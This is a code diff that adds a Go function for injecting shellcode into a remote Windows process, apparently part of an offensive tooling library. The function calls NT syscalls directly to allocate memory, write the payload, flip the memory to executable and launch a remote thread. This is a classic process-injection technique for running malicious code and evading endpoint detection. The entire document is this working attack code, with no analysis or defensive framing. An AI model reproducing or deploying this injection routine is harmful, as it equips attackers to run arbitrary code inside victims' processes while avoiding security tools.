@@ -1078,6 +1078,151 @@ func NtInjectSelfShellcode(payload []byte) error {
 	return nil
 }
 
+// NtInjectRemote injects shellcode into a remote process using direct syscalls ONLY
+// This function follows the proven pattern: allocate RW -> copy -> change to RX -> create thread
+// processHandle: Handle to the target process (must have PROCESS_ALL_ACCESS or appropriate rights)
+// payload: The shellcode bytes to inject
+func NtInjectRemote(processHandle uintptr, payload []byte) error {
+	if len(payload) == 0 {
+		return fmt.Errorf("payload is empty")
+	}
+	if processHandle == 0 {
+		return fmt.Errorf("invalid process handle")
+	}
+
+	debug.Printfln("WINAPI", "Starting remote injection into process handle 0x%X (%d bytes)\n", processHandle, len(payload))
+
+	// Step 1: Allocate RW memory in remote process (same pattern as self-injection)
+	var remoteBuffer uintptr
+	allocSize := uintptr(len(payload))
+	
+	status, err := NtAllocateVirtualMemory(
+		processHandle,
+		&remoteBuffer,
+		0,
+		&allocSize,
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_READWRITE,
+	)
+	
+	if err != nil {
+		return fmt.Errorf("NtAllocateVirtualMemory error: %v", err)
+	}
+	
+	if status != STATUS_SUCCESS {
+		return fmt.Errorf("NtAllocateVirtualMemory failed: %s", FormatNTStatus(status))
+	}
+	
+	debug.Printfln("WINAPI", "Allocated %d bytes at 0x%X\n", allocSize, remoteBuffer)
+
+	// Step 2: Write shellcode to remote memory
+	var bytesWritten uintptr
+	
+	status, err = NtWriteVirtualMemory(
+		processHandle,
+		remoteBuffer,
+		unsafe.Pointer(&payload[0]),
+		uintptr(len(payload)),
+		&bytesWritten,
+	)
+	
+	if err != nil {
+		// Cleanup on failure
+		freeSize := uintptr(0)
+		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
+		return fmt.Errorf("NtWriteVirtualMemory error: %v", err)
+	}
+	
+	if status != STATUS_SUCCESS {
+		// Cleanup on failure
+		freeSize := uintptr(0)
+		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
+		return fmt.Errorf("NtWriteVirtualMemory failed: %s", FormatNTStatus(status))
+	}
+	
+	if bytesWritten != uintptr(len(payload)) {
+		// Cleanup on failure
+		freeSize := uintptr(0)
+		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
+		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
+	}
+	
+	debug.Printfln("WINAPI", "Wrote %d bytes successfully\n", bytesWritten)
+
+	// Step 3: Change protection to RX (same as self-injection pattern)
+	var oldProtect uintptr
+	protectSize := uintptr(len(payload))
+	
+	status, err = NtProtectVirtualMemory(
+		processHandle,
+		&remoteBuffer,
+		&protectSize,
+		PAGE_EXECUTE_READ,
+		&oldProtect,
+	)
+	
+	if err != nil {
+		// Cleanup on failure
+		freeSize := uintptr(0)
+		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
+		return fmt.Errorf("NtProtectVirtualMemory error: %v", err)
+	}
+	
+	if status != STATUS_SUCCESS {
+		// Cleanup on failure
+		freeSize := uintptr(0)
+		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
+		return fmt.Errorf("NtProtectVirtualMemory failed: %s", FormatNTStatus(status))
+	}
+	
+	debug.Printfln("WINAPI", "Changed memory protection to RX\n")
+
+	// Step 4: Create remote thread using NtCreateThreadEx (fire and forget approach like working example)
+	var hThread uintptr
+	
+	status, err = NtCreateThreadEx(
+		&hThread,             // threadHandle - pointer to receive handle
+		THREAD_ALL_ACCESS,    // desiredAccess - full access to thread
+		0,                    // objectAttributes - NULL for basic usage
+		processHandle,        // processHandle - target process handle
+		remoteBuffer,         // startAddress - our shellcode address
+		0,                    // arg - no parameter to pass
+		0,                    // createFlags - 0 = run immediately (like working example)
+		0,                    // zeroBits - 0 for default
+		0,                    // stackSize - 0 for default
+		0,                    // maximumStackSize - 0 for default
+		0,                    // attributeList - NULL for basic usage
+	)
+	
+	if err != nil {
+		// Cleanup on failure
+		freeSize := uintptr(0)
+		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
+		return fmt.Errorf("NtCreateThreadEx error: %v", err)
+	}
+	
+	if status != STATUS_SUCCESS {
+		// Cleanup on failure
+		freeSize := uintptr(0)
+		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
+		return fmt.Errorf("NtCreateThreadEx failed: %s", FormatNTStatus(status))
+	}
+	
+	debug.Printfln("WINAPI", "Created remote thread: 0x%X\n", hThread)
+
+	// Step 5: Close thread handle immediately (fire and forget like working example)
+	closeStatus, err := NtClose(hThread)
+	if err != nil || closeStatus != STATUS_SUCCESS {
+		debug.Printfln("WINAPI", "Warning: Failed to close thread handle: %v %s\n", err, FormatNTStatus(closeStatus))
+	} else {
+		debug.Printfln("WINAPI", "Thread handle closed successfully\n")
+	}
+	
+	debug.Printfln("WINAPI", "Remote thread created and running - not waiting for completion\n")
+
+	return nil
+}
+
 
 
 
